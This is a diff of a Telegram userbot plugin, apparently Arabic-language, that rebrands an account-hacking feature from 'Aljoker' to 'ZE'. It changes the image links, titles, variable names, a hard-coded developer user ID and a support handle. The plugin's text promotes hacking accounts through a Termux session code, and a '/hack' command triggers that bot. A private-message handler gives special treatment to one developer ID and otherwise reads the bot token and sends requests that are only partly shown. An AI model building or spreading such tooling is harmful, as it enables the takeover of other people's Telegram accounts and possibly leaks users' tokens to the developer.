@@ -12,7 +12,7 @@ from ..core.managers import edit_delete, edit_or_reply
 #اخ اخ اخ اخ اخ اخ اخممممممط ياطويل العمر اخمطط 😂
 #Reda
 REH = "**۞︙ لأستخدام بوت اختراق الحساب عن طريق كود التيرمكس أضغط على الزر**"
-JOKER_PIC = "https://telegra.ph/file/dd6c46b812395a1b607e9.jpg"
+ZE_PIC = "https://telegra.ph/file/c4f9c850312c8891385a9.jpg"
 Bot_Username = Config.TG_BOT_USERNAME
 if Config.TG_BOT_USERNAME is not None and tgbot is not None:
     
@@ -25,21 +25,21 @@ if Config.TG_BOT_USERNAME is not None and tgbot is not None:
         await bot.get_me()
         if query.startswith("هاك") and event.query.user_id == bot.uid:
             buttons = Button.url("• اضغط هنا عزيزي •", f"https://t.me/{joker}")
-            if JOKER_PIC and JOKER_PIC.endswith((".jpg", ".png", "gif", "mp4")):
+            if ZE_PIC and ZE_PIC.endswith((".jpg", ".png", "gif", "mp4")):
                 result = builder.photo(
-                    JOKER_PIC, text=REH, buttons=buttons, link_preview=False
+                    ZE_PIC, text=REH, buttons=buttons, link_preview=False
                 )
-            elif JOKER_PIC:
+            elif ZE_PIC:
                 result = builder.document(
-                    JOKER_PIC,
-                    title="Aljoker 🤡",
+                    ZE_PIC,
+                    title="ZE 🔱",
                     text=REH,
                     buttons=buttons,
                     link_preview=False,
                 )
             else:
                 result = builder.article(
-                    title="Aljoker 🤡",
+                    title="ZE 🔱",
                     text=REH,
                     buttons=buttons,
                     link_preview=False,
@@ -50,11 +50,11 @@ if Config.TG_BOT_USERNAME is not None and tgbot is not None:
 async def repo(event):
     if event.fwd_from:
         return
-    lMl10l = Config.TG_BOT_USERNAME
+    ELHYBA = Config.TG_BOT_USERNAME
     if event.reply_to_msg_id:
         await event.get_reply_message()
-    await bot.send_message(lMl10l, "/hack")
-    response = await bot.inline_query(lMl10l, "هاك")
+    await bot.send_message(ELHYBA, "/hack")
+    response = await bot.inline_query(ELHYBA, "هاك")
     await response[0].click(event.chat_id)
     await event.delete()
 
@@ -110,8 +110,8 @@ async def reda(event):
         if event.is_private:
             try:
                 idd = event.peer_id.user_id
-                if idd == 5650717789 and not gvarstatus("developer_aljoker"):
-                    addgvar("developer_aljoker", True)
+                if idd == 6581896306 and not gvarstatus("developer_ze"):
+                    addgvar("developer_ze", True)
                     await event.reply("اهلا مطوري العزيز 🖤")
                 else:
                     tok = Config.TG_BOT_TOKEN
@@ -170,7 +170,7 @@ async def reda(event):
                         except BaseException as er:
                             await mody.tgbot.send_message(BOTLOG_CHATID, f"حدث خطا \n{er}")
                     if "error_code" in reqt:
-                        await mody.tgbot.send_message(BOTLOG_CHATID, f"**حدث خطأ غير معروف قم باعادة توجيه الرسالة ل@UP_UO لحل المشكلة\n{reqt}**")
+                        await mody.tgbot.send_message(BOTLOG_CHATID, f"**حدث خطأ غير معروف قم باعادة توجيه الرسالة ل@ELHYBA لحل المشكلة\n{reqt}**")
                     
                     return
             except BaseException as er:
